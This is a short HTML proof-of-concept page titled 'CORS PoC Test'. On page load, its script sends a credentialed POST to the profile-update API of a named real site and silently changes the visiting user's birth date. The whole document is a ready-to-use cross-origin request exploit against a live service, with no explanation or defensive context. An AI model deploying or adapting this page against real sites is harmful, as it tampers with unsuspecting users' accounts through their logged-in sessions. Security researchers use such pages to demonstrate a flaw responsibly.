<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>CORS PoC</title>
</head>
<body>
<h2>CORS PoC Test</h2>

<script>
fetch("https://1win.com/api/web/v1/user/api-v2-profile-update", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    birthday_date: "2005-01-02"
  })
})
.then(r => r.text())
.then(d => console.log(d))
.catch(e => console.error(e));
</script>

</body>
</html>
